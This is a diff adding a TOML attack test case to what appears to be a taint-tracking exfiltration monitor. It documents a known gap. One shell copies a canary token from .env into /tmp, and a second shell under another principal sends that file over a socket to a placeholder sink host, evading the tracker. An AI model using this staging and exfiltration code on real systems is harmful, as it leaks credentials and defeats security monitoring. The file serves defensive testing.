@@ -1,0 +1,43 @@
+# KNOWN GAP: taint follows the reading principal and the `secret` path class.
+# Shell 0 (its own principal) reads the secret and stages it OUTSIDE the
+# source, where no class labels it. Shell 1 (a different principal) reads that
+# outside file -- not a secret-classed read -- and egresses freely. The secret
+# reaches the external sink. Registered in known-gaps.toml.
+name = "cross-principal-staged"
+kind = "attack"
+policy = "recommended"
+# No shared `principal`: each shell is its own principal.
+
+[[files]]
+path = ".env"
+contents = "TOKEN={CANARY}\n"
+
+[[files]]
+path = "stage.py"
+contents = """
+secret = open(".env", "rb").read()
+open("/tmp/marsh-leak-stage", "wb").write(secret)
+"""
+
+[[files]]
+path = "send.py"
+contents = """
+import socket
+data = open("/tmp/marsh-leak-stage", "rb").read()
+s = socket.socket()
+s.connect(("{SINK_HOST}", {SINK_PORT}))
+s.sendall(data)
+"""
+
+[[steps]]
+shell = 0
+run = "python3 stage.py"
+expect = "accepted"
+
+[[steps]]
+shell = 1
+run = "python3 send.py"
+expect = "any"
+
+[oracle]
+encodings = ["raw", "base64", "hex"]
